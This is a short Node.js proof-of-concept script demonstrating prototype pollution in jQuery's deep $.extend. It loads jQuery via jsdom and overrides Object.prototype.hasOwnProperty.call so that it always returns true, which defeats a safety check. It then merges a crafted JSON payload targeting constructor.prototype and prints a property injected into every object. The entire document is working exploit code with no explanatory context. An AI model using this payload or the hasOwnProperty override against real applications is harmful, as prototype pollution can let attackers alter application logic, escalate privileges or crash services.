Object.prototype.hasOwnProperty.call = () => true;
const {JSDOM} = require('jsdom');
const {window} = new JSDOM('');
const $ = require('jquery')(window);
obj = {};
console.log({}.polluted);
$.extend(true, {}, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);